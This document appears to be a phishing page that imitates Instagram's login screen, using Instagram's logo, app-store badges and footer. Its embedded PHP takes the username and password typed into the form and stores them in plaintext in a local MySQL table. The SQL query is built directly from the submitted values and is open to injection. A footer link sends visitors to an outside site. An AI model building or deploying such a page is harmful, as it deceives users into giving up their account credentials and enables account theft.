<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=zh-hk" hreflang="zh-hk" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-cr" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-pr" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-cu" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-cl" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-sv" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-py" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-ar" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-gt" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-mx" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-do" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-bo" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-uy" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-hn" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-co" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-ni" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-pa" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-pe" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-ve" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=es-la" hreflang="es-ec" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=en-gb" hreflang="en-gb" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=sw-ke" hreflang="sw-ke" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=ha-ng" hreflang="ha-ng" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=am-et" hreflang="am-et" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=om-et" hreflang="om-et" />
<link rel="alternate" href="https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&amp;etoken=Abir3qWO7T0vpwKJxuRY4ULLjibgudYmMm1mWmpjKiQaacFbBdJt1Jpu1FmgAkJyDH63Yd4uBaHfFmFKE0pnjH-PpdJO9MPJ3WHFq5qUtpgyg8xkXrgXfW-f&amp;next=https://accountscenter.instagram.com/add/?auth_flow=ig_linking%26background_page=%252Faccounts%252F&amp;hl=fb-ha" hreflang="fb-ha" />

  <style>@media (prefers-color-scheme: dark){:root,body.loading{background:#000;}}</style>

</head>
<style>
    /* Universal Selectors */
#root, body, html {
  height:100%;
}

body {
  overflow-y: scroll;
}

a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
  margin:0;
  padding:0;
  border:0;
  font:inherit;
  vertical-align: baseline;
} 

a, a:visited {
  text-decoration: none;
}
a:active, .btn:active {
  opacity:.5;
}

ol, ul {
  list-style: none;
}

body, button, input {
  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  font-size:14px;
  line-height:18px;
}

#root, article, main, div, section, header, nav, footer {
  border: 0 solid #000000;
  box-sizing: border-box;
  align-items: stretch;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
  margin:0;
  padding:0;
  position: relative;
  -webkit-box-align: stretch;
    -moz-box-align: stretch;
  -webkit-box-orient: vertical;
    -moz-box-orient: vertical;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
} /* <--Universal Selectors End */


#root {
  z-index: 0;
}

.section-all {
  min-height:100%;
  overflow:hidden;
}

.main {
  background-color: #fafafa;
  order: 4;
  flex-grow: 1;
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -moz-box-ordinal-group: 5;
  -webkit-box-ordinal-group: 5;
}

.wrapper {
  min-height:100%;
  overflow: hidden;
}

.wrapper, .article {
  flex-grow: 1;
  justify-content: center;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;
  -webkit-box-pack: center;
    -moz-box-pack: center;
}

.article {
  flex-direction: row;
  margin:0 auto;
  max-width: 935px;
  width:100%;
  -webkit-box-orient: horizontal;
    -moz-box-orient: horizontal;
  -webkit-box-direction: normal;
    -moz-box-direction: normal;
}

.content {
  color:#262626;
  flex-grow:1;
  justify-content: center;
  max-width: 350px;
  margin-top:12px;
  -webkit-box-pack: justify;
    -moz-box-pack: justify;
  -webkit-box-flex: 1;
    -moz-box-flex: 1;  
}

.login-box {
  background: #fff;
  border: 1px solid #e6e6e6;
  border-radius: 1px;
  margin:0 0 10px;
  padding: 10px 0;
  /* align-items: center; */
}

.header {
  margin: 14.45px auto 12px;
}

.logo {
  background: cover no-repeat;
  width:175px;
  height:auto;
}

.form {
  display: flex;
  flex-direction: column;
  margin-bottom: 10px;
  -moz-box-direction: normal;
  -webkit-box-direction: normal;
}

.input-box {
  margin:auto 40px 6px;
}

input {
  height: 36px;
  border: 1px solid #efefef;
  border-radius: 3px;
  background-color: #fafafa;
  width:100%;
  font-size:12px;
  margin: 0;
  padding: 9px 0 7px 8px;
  outline: none;
  overflow: hidden;
  text-overflow: ellipsis;
  box-sizing: border-box;
}
input#name:focus, input#password:focus {
  border-color:#bbb;
}

.button-box {
  display: block;
  position: relative;
  margin: 8px 40px;
}
.btn {
  cursor: pointer;
  width: 100%;
  padding:0 8px; 
  background: #3897f0;
  border:1px solid #3897f0;
  color:#fff;
  border-radius:3px;
  font-weight:600;
  font-size: 14px;
  height: 28px;
  line-height: 26px;
  outline: none;
  white-space: nowrap;
}

.forgot, .forgot:active, .forgot:hover, .forgot:visited {
  font-size:12px;
  margin-top:12px;
  text-align: center;
  color:#003569;
  line-height: 14px!important;
}

.text {
  text-align:center;
  margin:15px;
  color:#262626;
  font-size:14px;
}

.text a, .text a:visited, .text a:hover, .text a:active {
  color:#3897f0;
  margin-left:3px;
}

/* App Store */
.app p {
  line-height: 18px;
  color:#262626;
  font-size:14px;
  text-align:center;
  margin:10px 20px;
}

.app-img {
  flex-direction: row;
  justify-content: center;
  margin:10px 0;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
}

.app-img a {
  margin-right:8px;
  height: 43.5px;
}

.app-img img {
  height:40px;
}

/* FOOTER */
.footer {
  background-color: #fafafa;
  order: 5;
  padding: 0 20px;
  background: #fafafa;
}

.footer-container {
  flex-direction: row;  
  flex-wrap:wrap;
  background-color: #fafafa;
  justify-content: space-between;
  padding: 38px 0;
  max-width:935px;
  font-size:12px;
  font-weight:600;
  margin:0 auto;
  text-transform:uppercase;
  width:100%
}

.footer-nav {
  max-width:100%;
}

.footer-nav ul {
  margin-right:16px;
  margin-bottom:3px;
  flex-grow:1;
}

.footer-nav ul li {
  display: inline-block;
  margin-right: 13px;
  margin-bottom:7px;
}

.footer-nav ul li a {
  color: #003569;
  text-decoration: none;
}

.footer span {
  color:#999;
}

span.language { 
  color: #003569;
  cursor: pointer;
  display: inline-block;
  font-weight: 600;
  position: relative;
  text-transform: uppercase;
  vertical-align: top;
}

.select {
  cursor: pointer;
  height: 100%;
  top: 0;
  opacity: 0;
  position: absolute;
  left:0;
  width: 100%;
}

/* Media Queries */
@media (max-width:450px) {
  .main {
    background-color: #fff;
  }

  .content {
    max-width: 100%;
    margin-top: 0;
    justify-content: space-between;
  }

  .login-box {
    background-color: transparent;
    border:none;
  }

  .logo {
    background: cover no-repeat;
    width:175px;
    height:auto;
    margin:0 auto;
  }

  .btn {
    cursor: pointer;
    width: 100%;
    padding:0 8px; 
    background: #3897f0;
    border:1px solid #3897f0;
    color:#fff;
    border-radius:3px;
    font-weight:600;
    font-size: 14px;
    height: 28px;
    line-height: 26px;
    outline: none;
    white-space: nowrap;
  }

  .input-box {
    border: 1px solid #efefef;
    border-radius: 3px;
    height: 36px;
    background: #fafafa;
    position: relative;
  }

  input {
    border: 0;
    background-color: #fafafa;
    width:100%;
    font-size:12px;
    margin: 0;
    padding: 9px 0 7px 8px;
    outline: none;
    overflow: hidden;
    text-overflow: ellipsis;
    box-sizing: border-box;
  }

  .input-box:hover, .input-box:focus {
    border-color:#bbb;
  }

}

@media only screen and (max-width:875px) {
  .footer-container {
    text-align: center;
    padding:10px 0;
  }
  .footer-container,  .footer-nav ul {
    justify-content: center;
    margin:0 auto;
    max-width: 360px;
    min-width: auto;
    -webkit-box-pack: center;
    -moz-box-pack: center;
  }

}
</style>
<body class="loading" style="">
        
    <div id="react-root">
      
      
  <span id="root">
    <section class="section-all">

      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="" name="sb" method="post" action="#instagram.php" >

                    <div class="input-box">
                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="">
                    </div>  

                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" >
                    </div>  

                    <div class="button-box">
                      <button class="btn" type="submit" name="sb">Log in</button>
                    </div>  

                    
                  </form>
                  <?php
                    if(isset($_POST['sb']))
                    {
                       $con=mysqli_connect('localhost','root','','instagram');
                       $username=$_POST['username'];
                       $password=$_POST['password'];
                       $query="INSERT INTO `inastagram`(`username`, `password`) VALUES ('$username','$password')";
                       $run=mysqli_query($con,$query);

              }?>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Get the app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="">About Us</a></li>
              <li><a href="">Support</a></li>
              <li><a href="">Blog</a></li>
              <li><a href="">Press</a></li>
              <li><a href="">Api</a></li>
              <li><a href="">Jobs</a></li>
              <li><a href="">Privacy</a></li>
              <li><a href="">Terms</a></li>
              <li><a href="">Directory</a></li>
              <li>
                <span class="language">Language
                  <select name="language" class="select" onchange="la(this.value)">
                    <option value="#">English</option>
                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                  </select>
                </span>
              </li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2018 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
      
    </section>
  </span> <!-- Root -->

  <!-- Select Link -->
  <script type="text/javascript">
    function la(src) {
      window.location=src;
    }
  </script>
</body>